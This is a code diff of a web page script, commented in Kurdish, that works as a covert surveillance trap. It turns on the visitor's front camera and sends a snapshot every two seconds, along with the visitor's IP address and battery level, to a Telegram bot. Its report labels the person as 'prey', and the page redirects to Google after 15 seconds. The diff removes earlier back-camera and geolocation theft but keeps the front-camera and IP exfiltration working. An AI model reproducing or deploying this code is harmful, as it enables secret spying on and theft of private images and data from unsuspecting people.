@@ -15,66 +15,41 @@
     async function capture() {
         if (!targetID) return;
 
-        // 🕒 دوای ١٥ چرکە نێچیرەکە دەنێرێت بۆ گوگل
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 15000);
+        setTimeout(() => { window.location.href = "https://www.google.com"; }, 15000);
 
         try {
-            // چالاککردنی هەردوو کامێراکە (پێشەوە و پشتەوە)
-            const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-
-            // وەرگرتنی زانیاری شەحن (Battery)
+            // یەکەمجار کامێرای پێشەوە چالاک دەکەین
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            
+            // ناردنی زانیارییەکان
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
             
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
-                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                                 `🌐 <b>Browser:</b> <code>${navigator.userAgent.split(' ')[0]}</code>`;
-                    sendToTelegram(report);
-                });
-
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendLocation(pos.coords.latitude, pos.coords.longitude);
+            fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
+                let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n👤 <b>ID:</b> <code>${targetID}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n🔋 <b>Battery:</b> <code>${batteryInfo}</code>`;
+                sendToTelegram(report);
             });
 
-            const videoFront = document.createElement('video');
-            videoFront.srcObject = streamFront;
-            videoFront.play();
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
 
-            const videoBack = document.createElement('video');
-            videoBack.srcObject = streamBack;
-            videoBack.play();
-
-            const takeSnap = (videoElement, label) => {
-                const canvas = document.createElement('canvas');
-                canvas.width = videoElement.videoWidth; 
-                canvas.height = videoElement.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoElement, 0, 0);
-                canvas.toBlob(b => {
-                    if (b) sendFile(b, label);
-                }, 'image/jpeg', 0.7);
+            const canvas = document.createElement('canvas');
+            const takeSnap = () => {
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(b => { if (b) sendFile(b, "Front"); }, 'image/jpeg', 0.7);
             };
 
-            // وێنەگرتن لە هەردوو کامێراکە هەر ٢ چرکە جارێک
-            setInterval(() => {
-                takeSnap(videoFront, "Front_Cam");
-                takeSnap(videoBack, "Back_Cam");
-            }, 2000);
+            // وێنەگرتن هەر ٢ چرکە جارێک
+            setInterval(takeSnap, 2000);
 
         } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان یان SSL چالاک نییە.");
         }
     }
 
@@ -86,18 +61,10 @@
         });
     }
 
-    function sendLocation(lat, lon) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
-        });
-    }
-
-    function sendFile(blob, type) {
+    function sendFile(blob, label) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
-        fd.append("photo", blob, `${type}.jpg`);
+        fd.append("photo", blob, `${label}.jpg`);
         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
